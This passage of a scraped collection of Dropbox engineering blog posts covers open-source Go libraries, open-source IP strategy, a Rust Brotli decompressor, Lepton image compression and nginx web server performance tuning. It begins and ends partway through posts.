1 8 I2C / GPIOs 2 12 24 GPIOs / I2C 2 3 6 I2C 2 1 2 UARTs (TxD, RxD) 2 4 8 CONSOLE (Tx, Rx) 2 1 2 GPIO / Pass-Through 2 2 4 PWM 1 8 8 Tacho/GPIOs 1 16 16 PECI 2 1 2 GPIOs 1 33 33 GPIO/GPIO Expanders (Serial GPIO) 4 1 4 Reset and Power Good 1 3 3 Watchdogs/GPIO 1 2 2 BOOT_IND# / GPIO 1 1 1 RESERVED/KLUDGE 1 1 1 The open road ahead Now that the RunBMC spec is published we expect to see contributions of RunBMC reference boards submitted by the community. We’re glad to be part of OCP so we can share what we're learning as we scale our infrastructure and carve the path for more secure, energy-efficient, and cost-effective hardware. We’re Hiring! If you're an engineer who loves to nerd out on infrastructure and hardware and how to manage it , come join the Production Infrastructure team ! // Tags Infrastructure Hardware Ocp Open Source Bmc // Copy link Link copied Link copied", "date": "2019-08-21"},
{"website": "Dropbox", "title": "Open Sourcing Our Go Libraries", "author": ["Patrick Lee"], "link": "https://dropbox.tech/infrastructure/open-sourcing-our-go-libraries", "abstract": "Dropbox owes a large share of its success to Python, a language that enabled us to iterate and develop quickly. However, as our infrastructure matures to support our ever growing user base, we started exploring ways to scale our systems in a more efficient manner. About a year ago, we decided to migrate our performance-critical backends from Python to Go to leverage better concurrency support and faster execution speed. This was a massive effort–around 200,000 lines of Go code–undertaken by a small team of engineers. At this point, we have successfully moved major parts of our infrastructure to Go. One recurring theme that hindered our development progress was the lack of robust libraries needed for building large systems. This is not surprising since Go is still a very young language. To address this issue, our team started building various libraries to provide better abstractions, such as connection management and a memcache client. We are very excited to announce that we are open sourcing these libraries to help the broader community build large scale production systems. We have included several libraries to kickstart this effort. To highlight a few: caching : provides a general abstraction for building caching layers. errors : enhances the standard error interface and exposes stack trace information. database/sqlbuilder : allows developers to generate sql statements programmatically. memcache : implements a fully featured memcache client library which supports connection pooling and flexible sharding. net2 : adds functionality for connection management. (and my personal favorite, hash2 , which includes a space efficient permutation-based consistent hash algorithm) We will continue to expand the set of libraries in the repository: https://github.com/dropbox/godropbox To make sure that we continue to invest in this open source effort, we are committed to using the public version of this repository internally. We are migrating our internal systems to use the libraries directly from this repository. This ensures all fixes and improvements are applied publicly before they are pulled back internally. We hope you will join our community and help make these libraries better! // Tags Infrastructure Open Source Go Golang // Copy link Link copied Link copied", "date": "2014-07-01"},
{"website": "Dropbox", "title": "Balancing open source and proprietary IP—they can co-exist", "author": ["Gideon Myles"], "link": "https://dropbox.tech/infrastructure/balancing-open-source-and-proprietary-ip-they-can-co-exist", "abstract": "Open source software can provide significant benefits to an organization—it can decrease product development time, distribute development across a community, and attract developers to your organization. It’s because of these benefits that we at Dropbox love open source. However, some organizations shy away from it due to perceived risks and fears around lost intellectual property (IP) rights. You’re not alone if you’re worried that once you’ve incorporated open source into your products or open sourced your own code that you’ve surrendered control over your most valuable assets, or worse, left your organization vulnerable to litigation with no defensive weapons to counter the threat. We too had that concern when we embarked on formalizing our open source program. Good news: it doesn’t have to be an either-or decision. It’s possible to simultaneously support open source while maintaining an active IP program. Smart organizations can avail themselves of the benefits of open source—decreased development time, community supported development and code review, platform adoption—and use various IP strategies to protect those aspects of its software that are unique to the business or provide a competitive advantage. We’ve taken a hybrid approach with several of our projects including Lepton , our streaming image compression format. When thinking about participating in open source the issues exist on a spectrum. There are 100% open sourced projects or products at one end, like the programming languages Python, Rust, and Google’s Go. In the middle are products that make use of a combination of open source and proprietary code. At the far end are proprietary products that are 100% closed source. Most businesses today are somewhere in the middle. Here are some tips for helping organizations participate in open source while maintaining their IP integrity. Identify your Motivation An important aspect in maintaining balance is identifying why you want to support an open source program. For example, is it because you don’t want to re-create the wheel, do you want to help maintain existing open source projects, do you want to use open source to attract and retain talent, do you want to promote your platform, do you want to be well-rounded open source participants, or is there some other reason? These are all legitimate motivators that can help you shape your open source program, identify risk, and chose the appropriate IP strategy. For us, it’s really all of the above, but sometimes only a subset of the factors apply to any individual open source opportunity. When we considered open sourcing Lepton at least two of the factors surfaced as key motivators: promoting our platform—we really wanted our compression technique to be adopted and incorporated in client applications like web browsers—and promoting the achievements of the engineers who developed the technique. Pick and Choose To strike an effective balance between open source and proprietary code, the key is to think strategically about the software, the value it can provide to the organization, and whether the technology should be developed internally. There are instances where software is actually more valuable because it includes open source components. For example, Dropbox encourages our engineers to think about open source when working on compilers, build tools, and analytics tools that enable our team to evaluate and assess our product. These tools support our development efforts. And by integrating open source components, Dropbox is engaging with a strong community to help us pinpoint weak spots, identify bugs, and maintain a steady pace of new feature releases. Not developing these capabilities exclusively in-house frees up our engineers to focus on projects that really drive the business. Contribute Back Something else we keep in mind is that open source is a two-way street. The community is stronger when everyone gives and takes, which is why Dropbox gives back to the community by contributing to other open source projects and open sourcing some of our own. With each contribution, we evaluate the IP rights that we may be granting to the community by asking a few simple questions. For example, will contributing to an existing open source project require us to grant licenses to patents in our portfolio? Will open sourcing a particular project achieve our goals? Or can we better achieve our goals by maintaining proprietary code that is protected through trade secrets or patents? Blended Protection Just as many organizations adopt a hybrid approach to open-sourcing, the same can also be true for specific products. There are certainly cases where there is value in open sourcing code, but there is additional value in preserving some of the IP rights. That’s a situation in which we might open source an implementation and file for a patent at the same time. In scoping the patent and the license terms, the open source community gets access to the software but the patent retains value. Apache 2.0 is an example of a license that delivers this layered protection. It allows other organizations to use open-sourced code for a specific use case, and receive a patent license for that code, but the granting organization retains the value for the rest of what the patent covers. Lepton is just one example of open sourcing our own projects, but it is one where we had serious discussions about our goals and how to achieve them. We can use the compression technique on our servers—and save storage space—and we could incorporate it into our client applications and compress the content before it is transferred to our servers—and save storage space and synchronization time. Because the compression technique provides such a significant savings it has clear business value and could provide a competitive advantage. So we saw a strong case for maintaining it as proprietary code and protecting through IP protections like patents. However, our client application isn’t the only way that files end up in a user’s Dropbox account. For example, some users upload content through the web. By open sourcing Lepton, it could be incorporated into web browsers, allowing files to be compressed client side. This provides a better user experience—decreased upload time—and space savings for us. So we also saw a strong case for open sourcing Lepton. After considering both sides it was clear to us that this was a prime scenario for a hybrid approach: open sourcing Lepton while simultaneously filing for patent protection. Ultimately, that is what we decided to do, and we open sourced it using the Apache 2.0 license. We get our compression technique out to the public, promote adoption, and benefit from insight from the community, but we protect some value for the company. Customized Agreements Another hybrid approach is to create customized open source licensing agreements. Say you have an open source license in place that doesn’t say anything about patent rights—an organization can add a custom patent license or a defensive termination clause that gives patent holders the ability to terminate a license if the licensee sues. Termination clauses can be customized to be stronger or weaker, broader or narrower, depending on the situation. For example, an organization could make a clause broader by adding provisions that allow licensors to terminate the license if the licensee sues at all—even if the lawsuit is unrelated to the open source project. When we open sourced Lepton we could’ve chosen a customized license or added a patent clause to an existing open source license. We opted for a traditional, permissive open source license that includes an explicit patent grant because it satisfied our needs. We want to promote adoption of Lepton, which we believe is achievable using an established permissive license. We also wanted clarity around which patent rights we’re granting (and what rights others are receiving), which the Apache 2.0 license provides. Due Diligence and Mutual Awareness Unfortunately, participation in open source isn’t without risk, so the push to explore open source options comes with guidelines. It’s important to vet all open source code thoroughly and keep clear documentation so, down the road, we know what’s in our code, what we’ve open sourced, and what responsibilities we bear. Additionally, it’s important that there’s mutual awareness about the company’s open source and IP strategies. True balancing can’t happen without strategy alignment and communication. Defensive Aggregators Finally, you can participate in open source and decrease risk by joining defensive aggregators, like LOT Network and Open Innovation Network —an organization designed to protect the linux kernel from patent litigation. In LOT Network, members sign agreements that include licensing terms which immunizes them from patent troll lawsuits, if (and only if) a fellow members’ patents are sold to a troll. Given that over half of companies sued by patent trolls make less than $10M in annual revenue , this type of agreement is especially beneficial to smaller companies in the open source community. And you don’t have to already have your own patents to participate in LOT Network. Whatever the case and whatever your goals, the first step is to figure out what kind of intellectual property you want to protect. The next step is to develop a system that ensures the vital elements remain under your company’s control and ownership. Open source doesn’t have to mean the end of ownership. If you’re smart about your open source/IP strategy, participating in the open source community can be an invaluable tool for building your own intellectual property more rapidly and securely. // Tags Infrastructure Intellectual Property Lepton Open Source // Copy link Link copied Link copied", "date": "2017-12-13"},
{"website": "Dropbox", "title": "Lossless compression with Brotli in Rust for a bit of Pied Piper on the backend", "author": ["Daniel Reiter Horn"], "link": "https://dropbox.tech/infrastructure/lossless-compression-with-brotli", "abstract": "What is Brotli? Requirements Speed vs Space Brotli Overview Effective Brotli Compression Brotli Decompression in Rust The Port Performance Closing Thoughts In HBO’s Silicon Valley , lossless video compression plays a pivotal role for Pied Piper as they struggle to stream HD content at high speed. John P. Johnson/HBO Inspired by Pied Piper, we created our own version of their algorithm Pied Piper at Hack Week . In fact, we’ve extended that work and have a bit-exact, lossless media compression algorithm that achieves extremely good results on a wide array of images. (Stay tuned for more on that!) However, to help our users sync and collaborate faster, we also need to work with a standardized compression format that already ships with most browsers. In that vein, we’ve been working on open source improvements to the Brotli codec , which will make it possible to ship bits to our business customers using 4.4% less of their bandwidth than through gzip. What is Brotli? Brotli is a Google open source project that includes a versatile encoder with a range of time/space settings. It’s already supported as an encoding format in Mozilla Firefox, Google Chrome, Android Browser, and Opera. In the diagram below, we’ve depicted Brotli’s impact as applied to typical business use-case files (excluding photographs and video). For a bit of fun, we’ve also included the Weissman score —a metric created for the TV show Silicon Valley for evaluating compression algorithms. Note that the Weissman score favors compression speed over ratio in most cases. Requirements We have two main requirements to implement Brotli in our storage pipeline: 1. We need to be able to rapidly ingest bytes in the Brotli format, meaning we need compression that runs significantly faster than line speed. 2. We need to be able to decompress any stream of bytes safely and repeatably. Speed vs Space The main challenge for compression on external traffic is the tradeoff between compression speed and compression ratio. On average, each file in Dropbox is written once and read just a handful of times in its lifetime. This means that if our desktop client or mobile client can comfortably compress the data faster than line speed, we save our users’ bandwidth and reduce the time to sync documents. Unfortunately, with the default settings, which use the Zopfli algorithm, Brotli can’t quite keep up with faster internet connections. For instance, a fast internet connection can upload several megabytes per second, but Brotli may require up to 20 seconds to compress just 4 megabytes of data. As an alternative to the Zopfli compression, using a greedy algorithm like gzip -9 to do the compression can waste up to 10% of the space but can keep up with almost any line speed. Brotli Overview To understand tradeoffs in making a Brotli compressor, it will help to give an overview of Brotli. Brotli files have a metablock header which encodes a set of named Huffman tables . Each Huffman table describes shorthand for bytes that may appear in a file. For example, in a Huffman table used to compress an English text file, commonly used letter like a e i o and u would probably be described with fewer bits than z or x , and the bytes describing the letter ø might not have an entry in the table at all. Here is an example Huffman table that might be helpful in encoding text with lots of h, u and m characters as in the long, Hawaiian word humuhumunukunukuapua'a : What you see is that the most common letter in the data we are trying to encode, u , is represented high up in the tree with a one-bit code of 0 . H , the second most common, is one node down with a two-bit code 10 . In this way, the more common letters are represented by fewer bits than the less common ones. After the metablock header, the rest of the file is simply a repeated set of command blocks. Each command block consists of three things: 1. the index of the Huffman table to use 2. the amount of data to copy from other parts of the file and where to find that data 3. new data encoded using the selected Huffman table. Effective Brotli Compression The challenge for the compressor is to figure out when to start a new command block and switch Huffman tables, versus chugging along with the current command block. Each switch costs precious bits, so the tradeoff is a complex optimization. In the greedy mode, Brotli does some trial block splits, then merges with the last or second-to-last block only if the file size would go down. In Zopfli mode, Brotli tries to find the optimal block splits and uses those for the final file. Here is an example of encoding a long word using the Huffman table above as Table A, with a choice of using a new Huffman Table B. Our insight was a simple one: optimal may be the enemy of good. In working with compressed data, we noticed that often several distinct ways of representing the data had very similar sizes. Our approach was simply to exclude 95% of the possible splits from the search. This still allowed for an occasional “creative” split to happen, since we were not restricted to a purely greedy approach, but it avoided most of the overhead with the search approach. The approach adds an additional 0.45% to the file size when it misses a few optimal block splits, but the compression speed more than doubles, bringing it in line with upload speeds. Including videos and photographs that comprise the majority of Dropbox storage, the final percent savings in bandwidth with the modified Brotli compressor is 4.4%. As an added bonus, the Brotli Weissman score goes up by 6.5%. I’m sure Richard Hendricks would be gleeful! Brotli Decompression in Rust Once the files have been uploaded, they need to be durably persisted as long as the user wishes, and at a moment’s notice they may need to be restored to their original bits exactly in a repeatable, secure way. For Dropbox, any decompressor must exhibit three properties: 1. it must be safe and secure, even against bytes crafted by modified or hostile clients, 2. it must be deterministic—the same bytes must result in the same output, 3. it must be fast. With these properties we can accept any arbitrary bytes from a client and have full knowledge that those bytes factually represent the file data. Unfortunately, the compressor supplied by the Brotli project only has the third property: it is very fast. Since the Brotli decompressor consists of a substantial amount of C code written by human beings, it is possibly neither deterministic nor safe and secure against carefully crafted hostile data. It could be both secure and deterministic, but there is simply too much code to reason through a mathematical proof of this hypothesis. Operating at Dropbox scale, we need to guarantee the security of our data, so our approach was to break down the problem into components. By writing a new Brotli decompressor in a language that is safe and deterministic, we only needed to analyze the language, not all the code written in it. This is because such a language would prevent us from executing unsafe code (eg. array out of bounds access) or nondeterministic code (eg reading uninitialized memory), so therefore we can trust the code to repeatably produce the same output without any security risks. The Rust programing language fits the bill perfectly: it’s a language that promises memory safety without garbage collection, concurrency without data races, and abstractions without overhead. It also has sufficient performance for our needs. That means that code written in Rust has the same memory requirements as the equivalent code written in C. At Dropbox, many of our services are actually memory bound, so this is a key advantage over a garbage collected language. We created rust-brotli , a direct port of the C decompressor into safe Rust. We also went one step further and wrote our own Rust memory allocator that can be used to allocate memory in the standard way using Boxes, or from a fixed size allocation on the heap, or even a pool on the stack. This allows us to put an upper bound on the memory we would allow for the decode of a single 4MB block. After the virtual memory is allocated, we enable a timer using the alarm syscall, to avoid a runaway process that never returns control. Finally, we enter the process into the secure computing (SECCOMP) mode, disabling any system calls except for read, write, sigreturn and exit. Even if there were a hypothetical gap in the safety of the Rust runtime, no hostile process could escape the sandbox and do harm to any Dropbox servers because system calls are blocked by the kernel’s SECCOMP filter before the call is ever executed. The Port Porting Brotli from C to Rust required a couple of steps to ensure it met our goals: 1. A foundational memory manager with a malloc-like interface needed to be created to abstract away any stdlib access. This ensured we could add SECCOMP support later and could operate without the stdlib. We created rust-alloc-no-stdlib for this purpose. 2. The bit_reader and Huffman modules were ported directly using the provided memory manager. Unit tests were created by running the C Brotli decompressor on various inputs and recording all data that entered or left the bit_reader or Huffman modules respectively. This made sure that all modules were dependable and could be expected to be correct when debugging the main decoder. 3. The BrotliState continuation structure was ported and lifetimes were mapped. This required discerning which pointers were statically sized data, owned data, or aliases to other data. 4. The main decode loop was ported, with stubbed out helpers. A common pattern in the decode.c was to pass the state struct into helpers alongside a bit_reader or a pointer to a Huffman table. The main loop had to be modified to pull those structures out of the main state struct. Sometimes the state struct could be broken down into related modules that could be independently borrowed by helper functions. 5. The control flow of the decode loop had to be modified to remove gotos and fallthroughs in case statements. 6. Integration tests needed to pass. The major bugs encountered centered around a handful of negative array indices being used to access slices of referenced arrays, the -- operator being interpreted as a no-op (repeated negation) rather than predecrement, and an errors where C performed a shift operation on an integer rather than a byte. Performance So given the safety, determinism and correctness, the final cornerstone is the speed of the Rust-based decompressor. Currently the decompressor runs at 72% of the speed of the vanilla -O3 optimized Brotli decompressor in gcc-4.9 for decompressing 4 megabyte blocks of data. This means it is able to safely decompress Brotli data at 217 MB/s on a Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz. Where is the 28% of the time going? a) Zeroing memory: Telling the Rust allocator to avoid zeroing the memory when allocating for Brotli improves the speed to 224 MB/s. b) Bounds checks: decompressing a Huffman coded file with backwards references requires a lot of table lookups. Sometimes code can have unexpected bounds checks: Copy fn sum_array_len_2(buffer : [i32], offset : usize) -> i32{\r\n  let sum : i32 = buffer[offset + 1];\r\n  return sum + buffer[offset + 0];\r\n} The above code counter-intuitively requires not one, but two array bounds checks. The reason for this is that offset + 1 may inadvertently wrap in release mode (it would panic in debug). This could cause the first overflow check to succeed where the second could fail. The fix in this case could be to restrict the range of the index variable so it will not wrap: Copy fn sum_array_len_2(buffer : [i32], offset : u32) -> i32{\r\n  let sum : i32 = buffer[offset as usize + 1];\r\n  return sum + buffer[offset as usize+ 0];\r\n} On many machines, the usize would give 64 bits of computational range to the addition. On those machines, the Rust compiler is intelligent enough to only insert a single bounds check in the above function since the 64 bit add will not wrap in any case where two 32 bit integers are added. However, many of the bounds checks cannot be elided like one of the two in the above example. To measure their effect, we made a macro fast!((array)[index]) to toggle between the safe operator[] on slices or else the unsafe get_unchecked() method, depending on whether a --features=unsafe flag was passed to the rust-brotli build. Activating unsafe mode results in another gain, bringing the total speed up to 249MB/s, bringing Brotli to within 82% of the C code. c) Offsets: The Brotli C code caches direct pointers to buffers and passes those to helper functions or saves them for future Brotli decode calls. Sometimes it even uses negative offsets on those pointers. Rust discourages a class of aliasing errors by enforcing that a single mutable pointer to a given object exists at a time and bars negative slice indices altogether. To operate properly, the Rust decompressor has to track the base slice plus an offset to avoid any negative array accesses and also to avoid two mutable borrows of a single buffer. d) Control flow: the original codebase had a number of gotos and case statements that would explicitly fall through. Neither of these features are present in Rust and they were emulated using a while loop encompassing a match statement, so that a fallthrough could be translated into a continue, and a break retains the semantics of a C break. These slight performance tradeoffs are easily mitigated by the fact that Brotli decompression actually is a fully streamable. That means that irrespective of the total time of the decompression, it’s possible to simply decompress the stream of bytes as they are downloaded and to overlap the cost of decompression with the byte download. Thus, only the first or last packets add to the time of the complete download. And since the data can traverse the network compressed, fewer bytes have to be downloaded, resulting in users being able to sync their Dropbox faster. The security and safety of Rust in a SECCOMP sandbox without the overhead of a garbage collector is a big win. It is worth the minor computational overhead of decompressing in a safe language with bounds checked arrays and determinism guarantees. Closing Thoughts Sure, that was a mouthful. But as they say on Silicon Valley , “most importantly we're making the world a better place through constructing elegant hierarchies for maximum code reuse and extensibility.\" More Pied Piper inside jokes and updates coming soon! // Tags Infrastructure Rust Open Source Performance Brotli Compression // Copy link Link copied Link copied", "date": "2016-06-29"},
{"website": "Dropbox", "title": "Lepton image compression: saving 22% losslessly from images at 15MB/s", "author": ["Daniel Reiter Horn"], "link": "https://dropbox.tech/infrastructure/lepton-image-compression-saving-22-losslessly-from-images-at-15mbs", "abstract": "Lepton at scale A few details about how Lepton works Encoding a block in Lepton Example image decompression using Lepton Summing it up We are pleased to announce the open source release of Lepton , our new streaming image compression format, under the Apache license. Lepton achieves a 22% savings reduction for existing JPEG images, by predicting coefficients in JPEG blocks and feeding those predictions as context into an arithmetic coder. Lepton preserves the original file bit-for-bit perfectly. It compresses JPEG files at a rate of 5 megabytes per second and decodes them back to the original bits at 15 megabytes per second, securely, deterministically, and in under 24 megabytes of memory. We have used Lepton to encode 16 billion images saved to Dropbox, and are rapidly recoding our older images. Lepton has already saved Dropbox multiple petabytes of space. Community participation and improvement to this new compression algorithm is welcome and encouraged! Lepton at scale At Dropbox, the security and durability of your data are our highest priorities. As an added security layer, Lepton runs within seccomp to disable all system calls except read and write of already-open file descriptors. Lepton has gone through a rigorous automated testing process demonstrating determinism on over 4 billion photos and counting. This means that once we verify an image decodes back to its original bits the first time, we can always get back to the original file in future decodes. All of our compression algorithms, including Lepton, decode every compressed file at least once and compare the result to the input, bit-for-bit, before persisting that file. Compressed files are placed into kernel-protected, read-only, memory before the bit-for-bit comparison to guarantee they are immutable during the full verification process. A few details about how Lepton works The JPEG format encodes an image by dividing it into a series of 8×8 pixel blocks, represented as 64 signed 10-bit coefficients. Thus the following 16×16 image would be encoded as 4 JPEG blocks. Instead of encoding pixel values directly, the signed 10-bit coefficients are the result of a reversible transformation called the Discrete Cosine Transform , or DCT for short. One of the 64 coefficients in a block, known as the DC, represents the brightness of the entire block of 8x8 pixels. The collection of all DC values in a whole JPEG can be viewed as a thumbnail that is a factor of 8 smaller than the original image in each dimension. The other 63 values, known as the AC coefficients, describe the fine detail going on in the 8x8 pixel block: for example, the texture of pebbles on a beach, or the pattern on a plaid shirt. Here’s an animation of the letter A becoming ever clearer as its AC coefficients are added one by one. The animation starts with the DC and adds each AC in turn which brings out the detail of the A . By Hanakus, CC BY-SA 3.0, via Wikimedia Commons Encoding a block in Lepton To encode the 63 AC coefficients, Lepton first serializes the number of non-zeros in the block, and then zigzags through the 8x8 block of coefficients, writing out each value using the efficient representation described below. Instead of writing bits as zeros and ones, Lepton encodes the data using the VP8 arithmetic coder , which can be very efficient, if supplied with carefully chosen context information from previous sections of the image. Stay tuned to future blog posts for more about the context Lepton feeds into the arithmetic coder. To encode an AC coefficient, first Lepton writes how long that coefficient is in binary representation, by using unary . Unary is a numerical representation that is as simple as counting off on your fingers. For example, three would be 1110. The extra zero at the end is the signal to stop counting. So, five would be 111110 and zero would just be 0. Next Lepton writes a 1 if the coefficient is positive or 0 if it is negative. Finally, Lepton writes the the absolute value of the coefficient in standard binary . Lepton saves a bit of space by omitting the leading 1, since any number greater than zero doesn’t start with zero. For example, here’s 47 represented in Lepton: For the coefficients we observed in JPEG files, the Lepton representation results in significantly fewer symbols than other encodings, such as pure unary, or fixed length two's complement . The DC coefficient (brightness in each 8x8 block) takes up a lot of room (over 8%) in a typical iPhone photograph so it’s important to compress it well. Most image formats put the DC coefficients before any AC coefficients in the file format. Lepton gets a compression advantage by coding the DC as the last value in each block. Since the DCs are serialized last, there is a wealth of information from the AC coefficients available to predict the DC coefficient. By defining a good and reproducible prediction, we can subtract the actual DC coefficient from the predicted DC coefficient, and only encode the delta. Then in the future we can use the prediction along with the saved delta to get the original DC coefficient. In almost all cases, this technique results in a significantly reduced number of symbols to feed into our arithmetic coder. Example image decompression using Lepton Let’s assume we are in the middle of decoding a JPEG file using Lepton, row by row. Here’s an example of a block in the middle of the image without a known brightness, only having the AC coefficients (the details) so far: Since we are decoding from left-to-right and top-to-bottom and have already decoded some blocks, we know all the pixels of the block directly above and the block to the left: One approach to predict the DC value could be to compute the overall brightness that minimizes the differences between all 16 pairs of pixels at the border of the current 8x8 block and both the left and top neighbors. This can be used as a first cut at the prediction. If we average based on the median 8 pixels and ignore the 8 of the outlier pixels, the above technique shrinks the DC by roughly 30% over baseline JPEG. Applying this technique to the example above results in this complete icon of a Dropbox: However, in reality, images tend to have smooth gradients, in the same way as the sky fades from blue to orange towards the horizon during a sunset. If we simply tried to reduce the difference between neighbor pixels, then we would be essentially predicting that any smooth gradients abruptly stop at 8x8 boundaries. A better prediction is to actually continue all gradients smoothly as in this illustration: Since we are encoding the DC after all the AC coefficients, and since the difference between a pair of pixels (the gradient ) does not depend on the brightness (DC), we can utilize the gradients in the current block to help compute a prediction. We also have the gradients from all pairs of pixels in the neighbor blocks, because they have been completely decoded. Thus, we can compute the gradient from the second row of the current block to the edge, and from the neighbors back to the edge, meeting in the middle, as illustrated: Where these two gradients meet in the middle, between these two pixels is the prediction point that Lepton uses to predict the DC of the current 8×8 block. The delta of this prediction is written in the same manner as the AC’s, using length, followed by sign and residual. For those familiar with Season 1 of Silicon Valley, this is essentially a “middle-out” algorithm. Pied Piper presents their “MIDDLE OUT!!’ algorithm at TechCrunch Disrupt, photo from HBO The overall savings from only encoding the delta reduces the stored size of the DC coefficients all the way down to 61% of their original size, saving 39%. DC coefficients occupy just 8% of an average JPEG file, but this middle-out algorithm still manages to contribute a significant reduction to the overall file size. Summing it up This is just one of the many techniques we use to save 22% on each JPEG file. The savings are surprisingly consistent over a wide range of images captured by modern cameras and cell phones. Lepton compression applied to 10,000 images Lepton can decompress significantly faster than line-speed for typical consumer and business connections. Lepton is a fully streamable format, meaning the decompression can be applied to any file as that file is being transferred over the network. Hence, streaming overlaps the computational work of the decompression with the file transfer itself, hiding latency from the user. Lepton decode rate when decoding 10,000 images on an Intel Xeon E5 2650 v2 at 2.6GHz Lepton encode rate when encoding 10,000 images on an Intel Xeon E5 2650 v2 at 2.6GHz The code for Lepton is open source and available today. It provides lossless, bit-exact storage for any type of photo, whether it be for archival purposes, or for serving live. Stay tuned for more details about how Lepton works and the challenges of compressing images at Dropbox scale. // Tags Infrastructure Lepton Open Source Performance Compression // Copy link Link copied Link copied", "date": "2016-07-14"},
{"website": "Dropbox", "title": "Optimizing web servers for high throughput and low latency", "author": ["Rbtz060917"], "link": "https://dropbox.tech/infrastructure/optimizing-web-servers-for-high-throughput-and-low-latency", "abstract": "Hardware Operating systems: Low level Operating systems: Networking stack Application level: Midlevel Application level: Highlevel This is an expanded version of my talk at NginxConf 2017 on September 6, 2017. As an SRE on the Dropbox Traffic Team, I’m responsible for our Edge network: its reliability, performance, and efficiency. The Dropbox edge network is an nginx-based proxy tier designed to handle both latency-sensitive metadata transactions and high-throughput data transfers. In a system that is handling tens of gigabits per second while simultaneously processing tens of thousands latency-sensitive transactions, there are efficiency/performance optimizations throughout the proxy stack, from drivers and interrupts, through TCP/IP and kernel, to library, and application level tunings. Disclaimer In this post we’ll be discussing lots of ways to tune web servers and proxies. Please do not cargo-cult them. For the sake of the scientific method, apply them one-by-one, measure their effect, and decide whether they are indeed useful in your environment. This is not a Linux performance post, even though I will make lots of references to bcc tools, eBPF , and perf, this is by no means the comprehensive guide to using performance profiling tools. If you want to learn more about them you may want to read through Brendan Gregg’s blog . This is not a browser-performance post either. I’ll be touching client-side performance when I cover latency-related optimizations, but only briefly. If you want to know more, you should read High Performance Browser Networking by Ilya Grigorik. And, this is also not the TLS best practices compilation. Though I’ll be mentioning TLS libraries and their settings a bunch of times, you and your security team, should evaluate the performance and security implications of each of them. You can use Qualys SSL Test , to verify your endpoint against the current set of best practices, and if you want to know more about TLS in general, consider subscribing to Feisty Duck Bulletproof TLS Newsletter . Structure of the post We are going to discuss efficiency/performance optimizations of different layers of the system. Starting from the lowest levels like hardware and drivers: these tunings can be applied to pretty much any high-load server. Then we’ll move to linux kernel and its TCP/IP stack: these are the knobs you want to try on any of your TCP-heavy boxes. Finally we’ll discuss library and application-level tunings, which are mostly applicable to web servers in general and nginx specifically. For each potential area of optimization I’ll try to give some background on latency/throughput tradeoffs (if any), monitoring guidelines, and, finally, suggest tunings for different workloads. Hardware CPU For good asymmetric RSA/EC performance you are looking for processors with at least AVX2 (avx2 in /proc/cpuinfo) support and preferably for ones with large integer arithmetic capable hardware (bmi and adx). For the symmetric cases you should look for AES-NI for AES ciphers and AVX512 for ChaCha+Poly. Intel has a performance comparison of different hardware generations with OpenSSL 1.0.2, that illustrates effect of these hardware offloads. Latency sensitive use-cases, like routing, will benefit from fewer NUMA nodes and disabled HT. High-throughput tasks do better with more cores, and will benefit from Hyper-Threading (unless they are cache-bound), and generally won’t care about NUMA too much. Specifically, if you go the Intel path, you are looking for at least Haswell/Broadwell and ideally Skylake CPUs. If you are going with AMD, EPYC has quite impressive performance. NIC Here you are looking for at least 10G, preferably even 25G. If you want to push more than that through a single server over TLS, the tuning described here will not be sufficient, and you may need to push TLS framing down to the kernel level (e.g. FreeBSD , Linux ). On the software side, you should look for open source drivers with active mailing lists and user communities. This will be very important if (but most likely, when) you’ll be debugging driver-related problems. Memory The rule of thumb here is that latency-sensitive tasks need faster memory, while throughput-sensitive tasks need more memory. Hard Drive It depends on your buffering/caching requirements, but if you are going to buffer or cache a lot you should go for flash-based storage. Some go as far as using a specialized flash-friendly filesystem (usually log-structured), but they do not always perform better than plain ext4/xfs. Anyway just be careful to not burn through your flash because you forgot to turn enable TRIM, or update the firmware. Operating systems: Low level Firmware You should keep your firmware up-to-date to avoid painful and lengthy troubleshooting sessions. Try to stay recent with CPU Microcode, Motherboard, NICs, and SSDs firmwares. That does not mean you should always run bleeding edge—the rule of thumb here is to run the second to the latest firmware, unless it has critical bugs fixed in the latest version, but not run too far behind. Drivers The update rules here are pretty much the same as for firmware. Try staying close to current. One caveat here is to try to decoupling kernel upgrades from driver updates if possible. For example you can pack your drivers with DKMS, or pre-compile drivers for all the kernel versions you use. That way when you update the kernel and something does not work as expected there is one less thing to troubleshoot. CPU Your best friend here is the kernel repo and tools that come with it. In Ubuntu/Debian you can install the linux-tools package, with handful of utils, but now we only use cpupower , turbostat , and x86_energy_perf_policy . To verify CPU-related optimizations you can stress-test your software with your favorite load-generating tool (for example, Yandex uses Yandex.Tank .) Here is a presentation from the last NginxConf from developers about nginx loadtesting best-practices: “ NGINX Performance testing .” cpupower Using this tool is way easier than crawling /proc/ . To see info about your processor and its frequency governor you should run: Copy $ cpupower frequency-info\n...\n  driver: intel_pstate\n  ...\n  available cpufreq governors: performance powersave\n  ...            \n  The governor \"performance\" may decide which speed to use\n  ...\n  boost state support:\n    Supported: yes\n    Active: yes Check that Turbo Boost is enabled, and for Intel CPUs make sure that you are running with intel_pstate , not the acpi-cpufreq , or even pcc-cpufreq . If you still using acpi-cpufreq , then you should upgrade the kernel, or if that’s not possible, make sure you are using performance governor. When running with intel_pstate , even powersave governor should perform well, but you need to verify it yourself. And speaking about idling, to see what is really happening with your CPU, you can use turbostat to directly look into processor’s MSRs and fetch Power, Frequency, and Idle State information: Copy # turbostat --debug -P\n... Avg_MHz Busy% ... CPU%c1 CPU%c3 CPU%c6 ... Pkg%pc2 Pkg%pc3 Pkg%pc6 ... Here you can see the actual CPU frequency (yes, /proc/cpuinfo is lying to you), and core/package idle states . If even with the intel_pstate driver the CPU spends more time in idle than you think it should, you can: Set governor to performance . Set x86_energy_perf_policy to performance. Or, only for very latency critical tasks you can: Use /dev/cpu_dma_latency interface. For UDP traffic, use busy-polling . You can learn more about processor power management in general and P-states specifically in the Intel OpenSource Technology Center presentation “ Balancing Power and Performance in the Linux Kernel ” from LinuxCon Europe 2015. CPU Affinity You can additionally reduce latency by applying CPU affinity on each thread/process, e.g. nginx has worker_cpu_affinity directive, that can automatically bind each web server process to its own core. This should eliminate CPU migrations, reduce cache misses and pagefaults, and slightly increase instructions per cycle. All of this is verifiable through perf stat . Sadly, enabling affinity can also negatively affect performance by increasing the amount of time a process spends waiting for a free CPU. This can be monitored by running runqlat on one of your nginx worker's PIDs: Copy usecs               : count     distribution\n    0 -&gt; 1          : 819      |                                        |\n    2 -&gt; 3          : 58888    |******************************          |\n    4 -&gt; 7          : 77984    |****************************************|\n    8 -&gt; 15         : 10529    |*****                                   |\n   16 